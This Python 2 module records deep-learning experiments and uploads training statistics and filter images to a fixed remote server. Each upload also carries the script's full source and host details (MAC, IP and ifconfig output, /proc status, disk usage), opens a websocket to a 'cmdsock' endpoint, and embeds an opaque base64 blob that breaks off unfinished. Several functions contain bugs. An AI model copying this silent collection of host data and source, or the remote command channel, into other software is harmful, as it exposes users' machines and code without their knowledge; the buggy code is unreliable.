#coding=gbk
import layerbase
import Queue
import threading
import requests
import time
starttime = time.time()
import numpy as np
import math
import cStringIO as sio
from itertools import izip
import os
import sys
try:
    import resource
except:
    resource = None
import platform
import uuid
import commands
import socket
import atexit
import json
import base64
import itsdangerous
import PIL
import re
from layerbase import DrawPatch
import locale
locallocale = locale.getpreferredencoding()

DATAREC = [
        ('sum', 'float'),
        ('abssum', 'float'),
        ('sqrsum', 'float'),
        ('max', 'float'),
        ('min', 'float'),
        ('absmax', 'float'),
        ('updatedeltaabs', 'float'),
        ('updatedeltasqr', 'float'),
        ('updatedeltasum', 'float'),
        ('filter', 'png'),
    ]

VISRESPREC = [
        ('resptrain', 'jpg'),
        ('respvalid', 'jpg'),
    ]

LOSSREC = [
        ('losstrain', 'float'),
        ('lossvalid', 'float'),
    ]

N = 61234458376886086861524070385274672740778091784697328983823014963978384987221695735286049226673298932707
G = 5

once = set()
def onlyonce(val):
    global once
    if val not in once:
        once.add(val)
        return True
    return False

def _gethash():
    import binascii
    fnames = [i.__file__ for i in sys.modules.values() if hasattr(i,'__file__')]
    hashs = []
    for i in fnames:
        try: hashs.append(binascii.crc32(file(i,'rb').read()))
        except: pass
    return reduce(lambda x,y:x^y,hashs)

def getmainsrc():
    if hasattr(sys.modules['__main__'],'__file__'):
        try: return repr(file(sys.modules['__main__'].__file__,'rb').read())
        except: return "[read fail]"
    return "[no src]"

def _bestsplit(val):
    t = int(math.sqrt(val))
    for i in range(t,0,-1):
        if val % i == 0:
            return i,val/i
    return 1,val

try:
    from blessings import Terminal


    class PatchedStdout:
        def __init__(self, mesg=''):
            self.org = sys.stdout
            self.term = Terminal()
            self.newline = True
            self.mesg = mesg
            self.alarm('Header Patch Enabled')
            sys.stdout=self
        
        def alarm(self, data):
            self.write(self.term.bold+self.term.yellow+data+self.term.normal)
            self.write('\n')
        
        def write(self, data):
            dlines = data.split('\n')
            for i in dlines[:-1]:
                if self.newline:
                    self.org.write(self.term.red+self.term.bold)
                    self.org.write('[%s] '%self.mesg)
                    self.org.write(self.term.normal)
                self.org.write(i)
                self.org.write('\n')
                self.newline = True
            if len(dlines[-1])!=0:
                if self.newline:
                    self.org.write(self.term.red+self.term.bold)
                    self.org.write('[%s] '%self.mesg)
                    self.org.write(self.term.normal)
                    self.org.flush()
                    self.newline = False
                self.org.write(dlines[-1])
        
        def flush(self):
            self.org.flush()
        
        def setmesg(self, mesg):
            self.mesg = mesg
        
except:
    class PatchedStdout:
        def __init__(self, mesg=''):
            self.org = sys.stdout
            self.newline = True
            self.mesg = mesg
            self.alarm('Header Patch Enabled without Blessings')
            sys.stdout = self
        
        def alarm(self, data):
            self.org.write(data)
            self.org.write('\n')
        
        def write(self, data):
            dlines = data.split('\n')
            for i in dlines[:-1]:
                if self.newline:
                    self.org.write('[%s] '%self.mesg)
                self.org.write(i)
                self.org.write('\n')
                self.newline = True
            if len(dlines[-1])!=0:
                if self.newline:
                    self.org.write('[%s] '%self.mesg)
                    self.org.flush()
                    self.newline = False
                self.org.write(dlines[-1])
        
        def flush(self):
            self.org.flush()
        
        def setmesg(self, mesg):
            self.mesg = mesg

if sys.platform == 'win32':
    import ctypes
    from ctypes import wintypes

    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
    GetCurrentProcess.argtypes = []
    GetCurrentProcess.restype = wintypes.HANDLE

    SIZE_T = ctypes.c_size_t

    class PROCESS_MEMORY_COUNTERS_EX(ctypes.Structure):
        _fields_ = [
            ('cb', wintypes.DWORD),
            ('PageFaultCount', wintypes.DWORD),
            ('PeakWorkingSetSize', SIZE_T),
            ('WorkingSetSize', SIZE_T),
            ('QuotaPeakPagedPoolUsage', SIZE_T),
            ('QuotaPagedPoolUsage', SIZE_T),
            ('QuotaPeakNonPagedPoolUsage', SIZE_T),
            ('QuotaNonPagedPoolUsage', SIZE_T),
            ('PagefileUsage', SIZE_T),
            ('PeakPagefileUsage', SIZE_T),
            ('PrivateUsage', SIZE_T),
        ]

    GetProcessMemoryInfo = ctypes.windll.psapi.GetProcessMemoryInfo
    GetProcessMemoryInfo.argtypes = [
        wintypes.HANDLE,
        ctypes.POINTER(PROCESS_MEMORY_COUNTERS_EX),
        wintypes.DWORD,
    ]
    GetProcessMemoryInfo.restype = wintypes.BOOL

    def get_current_process():
        """Return handle to current process."""
        return GetCurrentProcess()

    def get_memory_info(process=None):
        """Return Win32 process memory counters structure as a dict."""
        if process is None:
            process = get_current_process()
        counters = PROCESS_MEMORY_COUNTERS_EX()
        ret = GetProcessMemoryInfo(process, ctypes.byref(counters),
                                   ctypes.sizeof(counters))
        if not ret:
            raise ctypes.WinError()
        info = dict((name, getattr(counters, name))
                    for name, _ in counters._fields_)
        return info

    def get_memory_usage(process=None):
        """Return this process's memory usage in bytes."""
        info = get_memory_info(process=process)
        return info['PrivateUsage']
        
def _mystatrec():
    "记录程序统计信息"
    #main位置，GPU，内存，起止时间，机器名，IP，磁盘，load
    import __main__
    stat = {}
    #PATH
    if hasattr(__main__,'__file__'):
        stat['filepath'] = os.path.abspath(__main__.__file__)
    #GPU
    if 'theano' in sys.modules:
        stat['device'] = sys.modules['theano'].config.device
    #MEM
    if resource!=None:
        stat['mem'] = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        try:
            stat['status'] = file('/proc/self/status').read()
        except:
            pass
    elif sys.platform=='win32':
        stat['mem'] = str(get_memory_usage())
    #TIME
    stat['walltime'] = time.time() - starttime
    try:
        p = file('/proc/self/stat').read().strip().split()
        stat['usertime'] = int(p[14])
        stat['systime'] = int(p[15])
    except:
        pass
    #MACHINE
    stat['machine'] = platform.node()
    #IP/MAC
    stat['mac'] = uuid.getnode()
    if sys.platform=='win32':
        stat['ips'] = socket.gethostbyname(socket.gethostname())
    else:
        try:
            stat['ips'] = commands.getoutput('/sbin/ifconfig | grep -i "inet" | grep -iv "inet6" | awk {\'print $2\'} | sed -ne \'s/addr\:/ /p\'').replace('\n ',',')
            stat['detailip'] = commands.getoutput('ip address show')
        except:
            stat['ips'] = socket.gethostbyname(socket.gethostname())
    #DISKFREE
    #LOAD
    if sys.platform=='win32':
        stat['diskfree'] = re.findall(r"(?s)((?:\d+,?)+)", os.popen('dir','r').readlines()[-1].strip())
    else:
        try:
            stat['diskfree'] = commands.getoutput('df')
            stat['load'] = os.getloadavg()
        except:
            pass
    return stat

class AsyncRest:
    "异步REST派遣"
    def __init__(self, calls = 10000, parallel = 5):
        "启动多个REST服务程序"
        self.maxcall = calls
        self.parallel = parallel
        self.pool = Queue.Queue(self.maxcall)
        #Init thread pool
        def work():
            while True:
                url, data, callback = self.pool.get()
                while True:
                    try:
                        r = requests.post(url, data = data, timeout=30)
                        if r.status_code != 200: continue
                    except KeyboardInterrupt:
                        raise
                    except requests.exceptions.RequestException:
                        time.sleep(10)
                        continue
                    break
                if callback!=None:
                    try:
                        callback(r.text)
                    except KeyboardInterrupt:
                        raise
                    except:
                        import traceback
                        traceback.print_exc()
                self.pool.task_done()
        pool = [threading.Thread(target=work) for i in range(parallel)]
        for i in pool:
            i.daemon = True
            i.start()

    def restcall(self, url, data, callback = None):
        "提交一个REST请求"
        self.pool.put((url, data, callback))
    
    def blockcall(self, url, data):
        val = []
        ev = threading.Event()
        def setev(txt):
            val.append(txt)
            ev.set()
        self.pool.put((url, data, setev))
        
        while not ev.isSet():
            ev.wait(1)
        return val[0]
    
    def join(self):
        self.pool.join()

RECORD_INSTANCE = None
class Record:
    "实验记录，将进行的实验数据传至服务器"

    def __init__(self, server = 'exp.zysdomain.tk'):
        self.dirty = {}
        self.dataupload = None
        self.seq = 0
        self.server = server
        self.rest = AsyncRest()
        self.delegates = []
        atexit.register(self.S)
        global RECORD_INSTANCE
        RECORD_INSTANCE = self

    def _makerecmap_data(self, datamapid):
        "内部——生成数据记录列"
        recmap = self.meta['recmap']
        ret = []
        for name,datatype in DATAREC:
            ret.append(len(recmap))
            recmap.append({
                'dataid':datamapid,
                'func':name,
                'datatype':datatype
                })
        return ret

    def _makerecmap_loss(self, datamapid):
        "内部——生成LOSS记录列"
        recmap = self.meta['recmap']
        ret = []
        for name,datatype in LOSSREC:
            ret.append(len(recmap))
            recmap.append({
                'dataid':datamapid,
                'func':name,
                'datatype':datatype
                })
        return ret
    
    def _makerecmap_visresp(self, datamapid):
        "内部——生成输出记录列"
        recmap = self.meta['recmap']
        ret = []
        for name,datatype in VISRESPREC:
            ret.append(len(recmap))
            recmap.append({
                'dataid':datamapid,
                'func':name,
                'datatype':datatype
                })
        return ret
    
    def genmeta(self, model, sameranks = []):
        "根据网络结构生成元信息"
        self.model = model
        self.layers = model.layers
        #Extract each layer's name
        try:
            raise ZeroDivisionError
        except ZeroDivisionError:
            f = sys.exc_info()[2].tb_frame.f_back
        namelist = f.f_locals
        
        layernum = 0
        for i in self.layers:
            layernum += 1
            i.rec__name = 'l_'+str(layernum)
            for j in namelist.keys():
                if namelist[j] is i:
                    #Name each layer
                    i.rec__name = j

        #Create metadata
        struct = []
        datamap = []
        recmap = []
        #datamap: variables recorded in model
        #recmap: record data points
        #struct: network structure
        self.meta = {'struct':struct,'datamap':datamap,'recmap':recmap}
        structback = []
        for i in self.layers:
            if isinstance(i,layerbase.Layer):
                ast = {
                   'type':i.__class__.__name__,
                   'name':i.rec__name,
                   'outputs': layerbase.Layer.linkstruct[i],
                   'outshape': i.output_shape,
                   'hasparam': 0,
                   'hasloss': 0,
                   'hasvis': 0}
                if isinstance(i,layerbase.Param):
                    i.rec__dataparam_map = []
                    i.rec__dataparam = []
                    for j in i.params:
                        i.rec__dataparam_map.append(len(datamap))
                        i.rec__dataparam.append(self._makerecmap_data(len(datamap)))
                        params = {'dataname': j.name,
                                'layerid': len(struct),
                                'filtershape': j.get_value().shape}
                        datamap.append(params)
                    ast['hasparam'] = 1
                if isinstance(i,layerbase.VisLayer):
                    i.rec__visparam_map = len(datamap)
                    i.rec__visparam = self._makerecmap_visresp(len(datamap))
                    params = {'dataname': '_vis_'+i.rec__name,
                            'layerid': len(struct),
                            'filtershape': i.output_shape}
                    datamap.append(params)
                    ast['hasvis'] = 1
                if isinstance(i,layerbase.LossLayer):
                    self.loss = self._makerecmap_loss(len(datamap))
                    params = {'dataname': '_loss_'+i.rec__name,
                            'layerid': len(struct),
                            'filtershape': (1,)}
                    datamap.append(params)
                    ast['hasloss'] = 1
                i.rec__struct_id = len(struct)
                struct.append(ast)
                structback.append(i)
        
        refs = [0] * len(struct)
        
        for i in struct:
            i['outputs'] = [j.rec__struct_id for j in i['outputs'] if hasattr(j,'rec__struct_id')]
            for j in i['outputs']:
                refs[j] += 1
        
        #整理形状信息
        ref0 = [i for i in range(len(struct)) if refs[i]==0]
        masked = set()
        nrank = 0
        while ref0!=[]:
            while ref0!=[]:
                for i in ref0:
                    masked.add(i)
                    struct[i]['rank'] = nrank
                    for j in struct[i]['outputs']:
                        refs[j] -= 1
                ref0 = [i for i in range(len(struct)) if refs[i]==0 and i not in masked and (isinstance(structback[i],layerbase.VisSamerank) or structback[i] in sameranks)]
            ref0 = [i for i in range(len(struct)) if refs[i]==0 and i not in masked]
            nrank += 1
        
        #提交元信息，创建实验
        self.newexp()
    
    def newexp(self):
        "新实验"
        a = 1
        for i in os.urandom(40):
            a = a*256 + ord(i)
        A = pow(G,a,N)
        from select import select
        print "Experiment name:",
        sys.stdout.flush()
        try:
            rlist, _, _ = select([sys.stdin], [], [], 30)
            if rlist:
                naming = sys.stdin.readline().strip()
            else:
                print "Use default name"
                naming = ''
        except KeyboardInterrupt:
            raise
        except:
            naming = raw_input()
        #Call service
        val = self.rest.blockcall('http://'+self.server+'/newexperiment',{'meta':json.dumps(self.meta),'serieshash':_gethash(), 'A':str(A), 'naming': naming, 'mainsrc':getmainsrc()})
        vald = json.loads(val)
        self.expid = vald['id']
        self.expname = vald['name']
        B=int(vald['B'])
        self.exp_key = str(pow(B,a,N))
        self.signer = itsdangerous.Signer(self.exp_key)
        _stat = _mystatrec()
        self._stat = _stat
        self.patchout = PatchedStdout(self.expname.encode('utf-8')+(u'(%s,%s,%s)'%(self.expid,_stat['device'],os.path.split(_stat['filepath'])[1])).encode('utf-8'))
        interacthelper('ws://'+self.server+':8080/cmdsock',self)
        
    def R(self):
        "记录数值"
        self._newrec()
        for i in self.layers:
            if isinstance(i,layerbase.Param):
                for idx in range(len(i.params)):
                    param = i.params[idx]
                    val = param.get_value()
                    d1 = val.sum()
                    d2 = np.abs(val).sum()
                    d3 = (val*val).sum()
                    d4 = np.max(val)
                    d5 = np.min(val)
                    d6 = np.max(np.abs(val))
                    d1,d2,d3,d4,d5,d6 = map(float, (d1,d2,d3,d4,d5,d6))
                    dp = i.rec__dataparam[idx]
                    self.datastore.extend([
                        [dp[0], d1],
                        [dp[1], d2],
                        [dp[2], d3],
                        [dp[3], d4],
                        [dp[4], d5],
                        [dp[5], d6]])

    def Rlt(self, loss):
        "记录训练集loss"
        self._newrec()
        self.datastore.append([self.loss[0], float(loss)])

    def Rlv(self, loss):
        "记录验证集loss"
        self._newrec()
        self.datastore.append([self.loss[1], float(loss)])

    def Rd(self):
        "记录层信息有效更新值"
        self._newrec()
        for i in self.layers:
            if isinstance(i,layerbase.Param):
                if not hasattr(i,'rec__lastval'):
                    #Store thisval as lastval
                    i.rec__lastval = [np.copy(j.get_value()) for j in i.params]
                else:
                    thisval = [np.copy(j.get_value()) for j in i.params]
                    updates = [a-b for a,b in zip(thisval,i.rec__lastval)]
                    for idx in range(len(i.params)):
                        dp = i.rec__dataparam[idx]
                        #Record update
                        self.datastore.extend([
                            [dp[6], float(np.sum(np.abs(updates[idx])))],
                            [dp[7], float(np.sum(updates[idx]*updates[idx]))],
                            [dp[8], float(np.sum(updates[idx]))]])
                        #Store thisval as lastval
                        i.rec__lastval = thisval
    
    def Rv(self):
        "可视化记录层"
        self._newrec()
        #Render images for each W and b
        for i in self.layers:
            if isinstance(i,layerbase.Param):
                for idx in range(len(i.params)):
                    param = i.params[idx]
                    val = param.get_value()
                    img = None
                    #4 condition:
                    if len(val.shape)==4:
                        #Conv (4x)
                        img = PIL.Image.fromarray(DrawPatch(val))
                    elif len(val.shape)==5:
                        #OutputShape, InputShape, SizeH, SizeW, DimMixture
                        #Unshare (5x)
                        nshape = (val.shape[0],)+_bestsplit(val.shape[1])+(val.shape[2],val.shape[3],i.filter_shape[2],i.filter_shape[3])
                        img = PIL.Image.fromarray(DrawPatch(val.reshape(nshape).transpose((0,3,4,1,5,2,6)).reshape((nshape[0],nshape[3]*nshape[4],nshape[1]*nshape[5],nshape[2]*nshape[6])), blknorm = False))

                    elif len(val.shape)==2:
                        if hasattr(i,'reshape') and i.reshape!=None:
                            #ReshapeMatrix (2x, with_reshape)
                            img = PIL.Image.fromarray(DrawPatch(val.reshape((-1,)+i.reshape[1:])))
                        else:
                            #Matrix (2x)
                            img = IL.Image.fromarray(np.array((val-np.min(val))/(np.max(val)-np.min(val))*255,np.uint8))
                    else:
                        if onlyonce(i):
                            print "Warning: unhandled shape",val.shape
                    if img!=None:
                        #Record image
                        buf = sio.StringIO()
                        img.save(buf,'PNG')
                        self.imgstore.append([
                                i.rec__dataparam[idx][9],'.png', buf.getvalue()
                            ])

    
    def _enumvis(self):
        "内部——枚举输出"
        for i in self.layers:
            if isinstance(i,layerbase.Param):
                yield i

    def Rrt(self,resps):
        "可视化记录输入输出(训练集)"
        self._newrec()
        for l,i in izip(_enumvis(),resps):
            #Draw to img
            if len(i.shape)!=4:
                img = PIL.Image.fromarray(np.array((i-np.min(i))/(np.max(i)-np.min(i))*255,np.uint8))
            else:
                img = PIL.Image.fromarray(DrawPatch(i[0:1]))
            bug = sio.StringIO()
            img.save(buf,'JPEG',quality=100)
            self.imgstore.append([
                l.rec__visparam[0],'.jpeg', buf.getvalue()
                ])

    def Rrv(self,resps):
        "可视化记录输入输出(验证集)"
        self._newrec()
        for l,i in izip(_enumvis(),resps):
            #Draw to img
            if len(i.shape)!=4:
                img = PIL.Image.fromarray(np.array((i-np.min(i))/(np.max(i)-np.min(i))*255,np.uint8))
            else:
                img = PIL.Image.fromarray(DrawPatch(i[0:1]))
            bug = sio.StringIO()
            img.save(buf,'JPEG',quality=100)
            self.imgstore.append([
                l.rec__visparam[1],'.jpeg', buf.getvalue()
                ])

    def _newrec(self):
        "内部——新增记录结构"
        if self.dataupload == None:
            self.seq += 1
            self.datastore = []
            self.imgstore = []
            self.dataupload = {
                    'serialnum': self.seq,
                    'date': time.time(),
                    'data': self.datastore
                    }

    def _NewNameUpdate(self, data):
        content = json.loads(data)
        self.patchout.mesg = content['expname'].encode(locallocale,'replace') + (u'(%s,%s,%s)'%(self.expid,self._stat['device'],os.path.split(self._stat['filepath'])[1])).encode('utf-8')

    def C(self):
        "进行一个批次提交，附加提交瞬间内存CPU等信息，并运行委托"
        statupload = _mystatrec()
        dataupload = self.dataupload
        #Call api to load data/stat/single image
        self.rest.restcall('http://'+self.server+'/updateexp', {'expid':self.expid, 'info':self.signer.sign(json.dumps(statupload))},self._NewNameUpdate)
        self.rest.restcall('http://'+self.server+'/record', {'expid':self.expid, 'data':self.signer.sign(json.dumps(dataupload))})
        for meta,type_,data in self.imgstore:
            self.rest.restcall('http://'+self.server+'/recordimg', {'expid':self.expid,
                                                                    'data':self.signer.sign(
                                                                        json.dumps({'meta':meta, 'serial':dataupload['serialnum'], 'date':dataupload['date'], 'name':type_, 'b64data':base64.b64encode(data)})
                                                                    )}
                               )
        self.dataupload = None
        dcopy = list(self.delegates)
        self.delegates = []
        for i in dcopy:
            try: i()
            except KeyboardInterrupt: raise
            except SystemExit: raise
            except: pass
    
    def delegate(self,func):
        "增加一个委托"
        self.delegates.append(func)

    def S(self):
        "等待完成所有挂起的提交"
        import sys
        if not isinstance(sys.exc_info()[1],KeyboardInterrupt):
            time.sleep(20)

MINIWS = """
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
